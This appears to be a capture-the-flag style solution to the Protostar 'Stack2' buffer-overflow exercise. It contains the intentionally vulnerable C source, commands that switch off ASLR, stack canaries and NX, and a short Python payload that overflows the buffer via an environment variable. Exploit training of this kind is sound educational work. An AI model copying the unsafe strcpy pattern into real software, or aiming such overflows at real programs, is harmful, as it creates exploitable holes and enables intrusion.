## Protostar-Stack2 Solution

### 1. Introduction

This is a poc solution for the "Stack2" challenge of Protostar. It's short and hopefully it's easy for everyone who wants to have a look.

Source:
[https://web.archive.org/web/20170419023252/https://exploit-exercises.com/protostar/stack2/](https://web.archive.org/web/20170419023252/https://exploit-exercises.com/protostar/stack2/) 

**Hints:**
* Stack2 looks at environment variables, and how they can be set.

#### 1.1 Source code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```

#### 1.2 Compilation

Terminal command to compile with debug symbols + without pie + without nx-bit + Disable canaries + Disable ASLR + for x86:

```js
sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'

gcc -o 2 2.c -z execstack -fno-stack-protector -m32 -no-pie -g
```

### 2. Solution 

Okay, this challenge is pretty similar to Stack-1.
Hence I am not explaining again.

The only difference is the user-controlled env variable GREENIE is used in code and it is copied to "buffer" via strcpy(buffer, variable). The goal is same; etting the "modified" variable to 0x0d0a0d0a.

```bash
GREENIE=`python -c "print 'A' * 64 + '\x0a\x0d\x0a\x0d'"` ./2
you have correctly modified the variable
```
